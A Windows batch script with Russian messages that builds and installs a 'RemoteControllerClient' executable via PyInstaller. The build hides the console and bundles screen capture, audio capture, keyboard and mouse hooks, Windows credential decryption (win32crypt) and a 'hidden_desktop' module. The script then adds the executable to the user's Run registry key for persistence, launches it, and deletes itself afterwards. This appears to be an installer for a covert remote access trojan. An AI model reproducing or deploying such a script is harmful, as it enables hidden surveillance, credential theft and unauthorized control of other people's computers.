@echo off
setlocal

set "SCRIPT_DIR=%~dp0"
pushd "%SCRIPT_DIR%"

where python >nul 2>nul
if errorlevel 1 (
    echo Python не найден. Установите Python 3.11+ и повторите запуск.
    exit /b 1
)

if not exist ".venv\\Scripts\\activate.bat" (
    echo Создаем виртуальное окружение...
    python -m venv .venv
    if errorlevel 1 (
        echo Не удалось создать виртуальное окружение.
        popd
        exit /b 1
    )
)

call .venv\\Scripts\\activate.bat

echo Обновляем pip/setuptools/wheel...
python -m pip install --upgrade pip setuptools wheel

set "REQ_FILE=%SCRIPT_DIR%..\\requirements.txt"
if exist "%REQ_FILE%" (
    echo Устанавливаем общие зависимости проекта...
    python -m pip install -r "%REQ_FILE%"
) else (
    echo Устанавливаем зависимости клиента...
    python -m pip install -r requirements-client.txt
)
if errorlevel 1 (
    echo Установка зависимостей завершилась с ошибкой.
    popd
    exit /b 1
)

echo Устанавливаем PyInstaller...
python -m pip install pyinstaller
if errorlevel 1 (
    echo Установка PyInstaller завершилась с ошибкой.
    popd
    exit /b 1
)

echo Собираем exe...
pyinstaller --onefile --name RemoteControllerClient --clean --noconsole ^
    --collect-all av ^
    --collect-all aiortc ^
    --collect-all sounddevice ^
    --collect-all mss ^
    --collect-all numpy ^
    --hidden-import=win32crypt ^
    --hidden-import=cryptography ^
    --hidden-import=pynput ^
    --hidden-import=pynput.mouse ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=remote_client.apps.launcher ^
    --hidden-import=remote_client.windows.hidden_desktop ^
    client.py
if errorlevel 1 (
    echo Сборка завершилась с ошибкой.
    popd
    exit /b 1
)

set "EXE_PATH=%SCRIPT_DIR%dist\\RemoteControllerClient.exe"
if not exist "%EXE_PATH%" (
    echo Не найден файл %EXE_PATH%
    popd
    exit /b 1
)

if exist "%SCRIPT_DIR%start_silent.vbs" (
    copy /y "%SCRIPT_DIR%start_silent.vbs" "%SCRIPT_DIR%dist\start_silent.vbs" >nul
)


echo Добавляем в автозапуск текущего пользователя...
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RemoteControllerClient" /t REG_SZ /d "\"%EXE_PATH%\"" /f >nul

echo Запускаем клиент...
start "" "%EXE_PATH%"

echo.
echo Готово! Файл: dist\\RemoteControllerClient.exe
echo.

popd
start "" /b cmd /c "ping 127.0.0.1 -n 2 > nul & del \"%~f0\""
endlocal
